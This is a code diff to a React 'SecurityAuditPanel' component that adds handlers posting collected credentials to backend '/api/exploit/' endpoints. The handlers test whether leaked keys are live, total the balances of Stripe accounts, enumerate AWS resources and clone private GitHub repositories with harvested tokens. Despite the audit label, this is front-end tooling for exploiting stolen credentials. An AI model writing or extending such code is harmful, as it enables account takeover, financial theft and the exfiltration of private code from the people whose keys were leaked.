@@ -608,7 +608,32 @@ export default function SecurityAuditPanel() {
                     <p className="text-gray-400 text-sm">Test all keys automatically</p>
                   </div>
                 </div>
-                <button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold transition">
+                <button 
+                  onClick={async () => {
+                    if (!results.length) return alert('No credentials to test');
+                    const btn = event.target;
+                    btn.disabled = true;
+                    btn.textContent = 'Testing...';
+                    try {
+                      const response = await fetch(`${API_URL}/api/exploit/test-all`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
+                        body: JSON.stringify({ credentials: results })
+                      });
+                      const data = await response.json();
+                      if (data.success) {
+                        alert(`Tested ${data.tested} keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\nActive: ${data.summary.active}`);
+                        console.log('Test results:', data.results);
+                      }
+                    } catch (error) {
+                      alert('Test failed: ' + error.message);
+                    } finally {
+                      btn.disabled = false;
+                      btn.textContent = `Test All Keys (${results.length})`;
+                    }
+                  }}
+                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
+                >
                   Test All Keys ({results.length})
                 </button>
                 <div className="mt-3 text-xs text-gray-400">
@@ -625,7 +650,33 @@ export default function SecurityAuditPanel() {
                     <p className="text-gray-400 text-sm">Check Stripe account balances</p>
                   </div>
                 </div>
-                <button className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition">
+                <button
+                  onClick={async () => {
+                    const stripeKeys = results.filter(r => r.category === 'financial');
+                    if (!stripeKeys.length) return alert('No Stripe keys found');
+                    const btn = event.target;
+                    btn.disabled = true;
+                    btn.textContent = 'Checking...';
+                    try {
+                      const response = await fetch(`${API_URL}/api/exploit/check-balances`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
+                        body: JSON.stringify({ credentials: stripeKeys })
+                      });
+                      const data = await response.json();
+                      if (data.success) {
+                        alert(`Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`);
+                        console.log('Balance results:', data.results);
+                      }
+                    } catch (error) {
+                      alert('Check failed: ' + error.message);
+                    } finally {
+                      btn.disabled = false;
+                      btn.textContent = `Check Balances (${stripeKeys.length})`;
+                    }
+                  }}
+                  className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
+                >
                   Check Balances ({results.filter(r => r.category === 'financial').length})
                 </button>
                 <div className="mt-3 text-xs text-gray-400">
@@ -642,7 +693,27 @@ export default function SecurityAuditPanel() {
                     <p className="text-gray-400 text-sm">List all AWS resources</p>
                   </div>
                 </div>
-                <button className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-lg font-semibold transition">
+                <button
+                  onClick={async () => {
+                    const awsKeys = results.filter(r => r.category === 'cloud_access');
+                    if (!awsKeys.length) return alert('No AWS keys found');
+                    try {
+                      const response = await fetch(`${API_URL}/api/exploit/scan-aws`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
+                        body: JSON.stringify({ credentials: awsKeys })
+                      });
+                      const data = await response.json();
+                      if (data.success) {
+                        alert(`Found ${data.awsKeys} AWS keys\n\nInstructions:\n${data.instructions.join('\n')}`);
+                        console.log('AWS keys:', data.keys);
+                      }
+                    } catch (error) {
+                      alert('Scan failed: ' + error.message);
+                    }
+                  }}
+                  className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-lg font-semibold transition"
+                >
                   Scan AWS ({results.filter(r => r.category === 'cloud_access').length})
                 </button>
                 <div className="mt-3 text-xs text-gray-400">
@@ -659,7 +730,33 @@ export default function SecurityAuditPanel() {
                     <p className="text-gray-400 text-sm">Download private repos</p>
                   </div>
                 </div>
-                <button className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold transition">
+                <button
+                  onClick={async () => {
+                    const githubTokens = results.filter(r => r.credential_type === 'github_token');
+                    if (!githubTokens.length) return alert('No GitHub tokens found');
+                    const btn = event.target;
+                    btn.disabled = true;
+                    btn.textContent = 'Scanning...';
+                    try {
+                      const response = await fetch(`${API_URL}/api/exploit/clone-github`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
+                        body: JSON.stringify({ credentials: githubTokens })
+                      });
+                      const data = await response.json();
+                      if (data.success) {
+                        alert(`Scanned ${data.checked} tokens\n\nActive: ${data.summary.active}\nTotal Private Repos: ${data.summary.totalRepos}`);
+                        console.log('GitHub repos:', data.results);
+                      }
+                    } catch (error) {
+                      alert('Clone failed: ' + error.message);
+                    } finally {
+                      btn.disabled = false;
+                      btn.textContent = `Clone Repos (${githubTokens.length})`;
+                    }
+                  }}
+                  className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
+                >
                   Clone Repos ({results.filter(r => r.credential_type === 'github_token').length})
                 </button>
                 <div className="mt-3 text-xs text-gray-400">
